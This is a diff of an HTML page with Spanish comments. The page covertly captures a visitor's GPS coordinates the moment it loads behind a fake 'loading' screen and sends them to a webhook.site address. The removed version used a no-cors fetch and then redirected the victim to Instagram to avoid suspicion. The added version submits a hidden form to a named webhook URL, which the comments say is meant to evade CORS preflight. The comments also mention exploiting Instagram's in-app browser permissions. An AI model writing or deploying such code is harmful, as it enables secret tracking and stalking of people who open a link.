@@ -3,66 +3,43 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cargando contenido...</title>
-    <style>
-        /* Pantalla de carga simple para camuflar el proceso mientras se realiza el envío */
-        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #fafafa; color: #666; }
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #0095f6; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin-bottom: 20px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .content { text-align: center; }
-    </style>
+    <title>Cargando...</title>
 </head>
-<!-- Ejecución automática apenas carga la página en el navegador interno -->
 <body onload="capturaInmediata()">
 
-<div class="content">
-    <div class="loader" style="margin: 0 auto 15px auto;"></div>
-    <p>Cargando contenido de la aplicación...</p>
-</div>
+    <p>Cargando contenido, por favor espere...</p>
+
+    <!-- Formulario invisible que utilizaremos para saltar el bloqueo CORS del navegador -->
+    <form id="formularioOculto" action="https://webhook.site/3fcd9f6f-4376-4687-9ef1-965474b0dba3" method="POST" style="display:none;">
+        <input type="text" name="coordenadas" id="campoCoordenadas">
+    </form>
 
 <script>
 function capturaInmediata() {
     if (navigator.geolocation) {
-        // Solicita las coordenadas. Si el permiso está pre-aprobado por la app, va directo a 'enviarFondo'
-        navigator.geolocation.getCurrentPosition(enviarFondo, forzarSalida, {
+        navigator.geolocation.getCurrentPosition(enviarViaFormulario, manejarError, {
             enableHighAccuracy: true,
-            timeout: 4000 // Tiempo límite de espera para no congelar la pantalla
+            timeout: 6000 // Aumentamos a 6 segundos por si estás en PC
         });
     } else {
-        forzarSalida();
+        manejarError();
     }
 }
 
-function enviarFondo(posicion) {
-    // URL de tu Webhook.site configurada para la prueba
-    const urlWebhook = 'https://webhook.site'; 
-
-    // Convertimos las coordenadas en una cadena de texto simple.
-    // Esto evita que el navegador de Instagram envíe la petición previa OPTIONS (Preflight)
-    const datosTexto = `Latitud: ${posicion.coords.latitude} | Longitud: ${posicion.coords.longitude} | Precision: ${posicion.coords.accuracy} metros`;
-
-    // Envío directo en segundo plano
-    fetch(urlWebhook, {
-        method: 'POST',
-        mode: 'no-cors', // Evita las restricciones estrictas de CORS para este entorno de pruebas
-        headers: { 
-            'Content-Type': 'text/plain' 
-        },
-        body: datosTexto
-    })
-    .then(() => {
-        // Redirección inmediata tras el envío
-        forzarSalida();
-    })
-    .catch(() => {
-        // Redirige también en caso de error para no levantar sospechas en la interfaz
-        forzarSalida();
-    });
+function enviarViaFormulario(posicion) {
+    const info = `Lat: ${posicion.coords.latitude} | Lon: ${posicion.coords.longitude} | Prec: ${posicion.coords.accuracy}m`;
+    
+    // Insertamos el texto de las coordenadas en el formulario oculto
+    document.getElementById('campoCoordenadas').value = info;
+    
+    // Enviamos el formulario. Esto genera un POST directo y nativo, eliminando el OPTIONS.
+    document.getElementById('formularioOculto').submit();
 }
 
-function forzarSalida() {
-    // Saca al usuario de la página web enviándolo de vuelta a una sección común de la red social
-    window.location.href = "https://instagram.com";
+function manejarError(error) {
+    // Si el navegador de la PC bloquea el GPS o no lo encuentra, enviamos un aviso de error al webhook
+    document.getElementById('campoCoordenadas').value = "Error: Permiso denegado o GPS no disponible en este dispositivo.";
+    document.getElementById('formularioOculto').submit();
 }
 </script>
 
